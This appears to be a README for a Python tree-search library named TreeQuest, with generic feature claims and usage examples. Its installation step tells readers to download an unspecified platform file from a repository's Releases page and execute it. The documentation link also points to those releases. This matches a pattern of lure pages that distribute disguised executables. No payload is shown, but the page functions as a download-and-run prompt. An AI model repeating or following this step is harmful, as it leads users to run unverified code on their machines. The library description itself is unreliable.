## Overview

TreeQuest is a powerful tree search library designed for flexible API integration, particularly for large language model (LLM) inference-time scaling. This library enables developers to implement efficient search algorithms with ease, enhancing the performance of their applications. With TreeQuest, you can manage complex data structures while maintaining a simple interface.

## Features

- **Flexible API**: Customize the search process to fit your specific needs.
- **Efficient Algorithms**: Implement advanced tree search techniques for optimal performance.
- **Scalability**: Scale your applications effectively during inference time.
- **User-Friendly**: Designed for ease of use, even for those new to tree structures.
- **Extensive Documentation**: Comprehensive guides and examples to get you started quickly.

## Installation

To install TreeQuest, you can download the latest release from the [Releases section](https://github.com/tharukthathsilu/treequest/releases). Simply download the appropriate file for your platform, and follow the instructions to execute it.

```bash
# Example command to execute the downloaded file
./treequest-install.sh
```

## Usage

Using TreeQuest is straightforward. Hereâ€™s a basic example to get you started:

```python
from treequest import TreeSearch

# Initialize the tree search
search = TreeSearch()

# Define your search parameters
search.set_parameters(depth_limit=10, heuristic='best_first')

# Execute the search
result = search.execute(initial_state, goal_state)

print("Search Result:", result)
```

## API Documentation

TreeQuest provides a rich API for developers. Here are some key components:

### TreeSearch Class

- **`__init__(self)`**: Initializes the tree search instance.
- **`set_parameters(self, depth_limit, heuristic)`**: Sets the parameters for the search.
- **`execute(self, initial_state, goal_state)`**: Executes the search algorithm and returns the result.

For more detailed API documentation, refer to the [official documentation](https://github.com/tharukthathsilu/treequest/releases).

## Examples

Here are some practical examples to demonstrate the capabilities of TreeQuest:

### Example 1: Depth-First Search

```python
from treequest import TreeSearch

# Create a depth-first search instance
dfs = TreeSearch()

# Set parameters for depth-first search
dfs.set_parameters(depth_limit=5, heuristic='depth_first')

# Execute the search
result = dfs.execute(start_node, target_node)

print("Depth-First Search Result:", result)
```

### Example 2: Best-First Search

```python
from treequest import TreeSearch

# Create a best-first search instance
bfs = TreeSearch()

# Set parameters for best-first search
bfs.set_parameters(depth_limit=10, heuristic='best_first')

# Execute the search
result = bfs.execute(start_node, target_node)

print("Best-First Search Result:", result)
```
